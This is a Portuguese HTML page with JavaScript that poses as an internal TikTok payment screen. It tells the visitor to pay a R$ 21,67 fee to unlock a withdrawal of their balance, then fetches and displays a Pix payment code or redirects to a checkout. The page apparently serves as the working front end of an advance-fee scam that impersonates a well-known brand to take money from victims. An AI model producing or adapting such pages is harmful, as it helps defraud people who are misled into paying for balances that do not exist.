<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>App TikTok - Pagamento Interno</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background: #010101; color: white; }
        .btn-pay { background: #ff0050; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; max-width: 300px; }
        .btn-pay:disabled { background: #555; }
        #pix-area { margin-top: 20px; background: #111; padding: 20px; border-radius: 10px; border: 1px solid #333; display: none; }
        textarea { width: 100%; height: 80px; background: #000; color: #0f0; border: 1px solid #444; padding: 10px; margin: 10px 0; font-family: monospace; font-size: 12px; }
        .copy-btn { background: #00f2ea; color: #000; border: none; padding: 10px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <h2>Finalizar Saque</h2>
    <p>Pague a taxa de R$ 21,67 para liberar seu saldo.</p>
    
    <button class="btn-pay" id="payBtn">GERAR CÓDIGO PIX</button>

    <div id="pix-area">
        <p>✅ Pix Gerado com Sucesso!</p>
        <p style="font-size: 14px; color: #aaa;">Copie o código abaixo e pague no seu banco:</p>
        <textarea id="pixPayload" readonly></textarea>
        <button class="copy-btn" onclick="copyPix()">COPIAR CÓDIGO PIX</button>
        <p style="font-size: 12px; margin-top: 15px;"><a href="#" id="backupLink" target="_blank" style="color: #ff0050;">Problemas? Pagar pelo Checkout</a></p>
    </div>

    <script>
    const payBtn = document.getElementById('payBtn');
    const pixArea = document.getElementById('pix-area');
    const pixPayload = document.getElementById('pixPayload');

    payBtn.onclick = async () => {
        payBtn.innerText = "GERANDO...";
        payBtn.disabled = true;

        try {
            const res = await fetch('/.netlify/functions/pix');
            const data = await res.json();

            if (data.pixCopyPaste) {
                // Exibe na mesma página se a API retornar o código direto
                pixPayload.value = data.pixCopyPaste;
                pixArea.style.display = "block";
                payBtn.style.display = "none";
            } else if (data.paymentUrl) {
                // Se não retornar o código, redireciona para o checkout seguro
                window.location.href = data.paymentUrl;
            } else {
                alert("Não foi possível gerar o pagamento. Tente novamente.");
            }
        } catch (err) {
            alert("Erro de conexão com o servidor.");
        } finally {
            payBtn.innerText = "PAGAR TAXA AGORA";
            payBtn.disabled = false;
        }
    };

    function copyPix() {
        pixPayload.select();
        document.execCommand('copy');
        alert("Código Pix copiado!");
    }
</script>
</body>
</html>
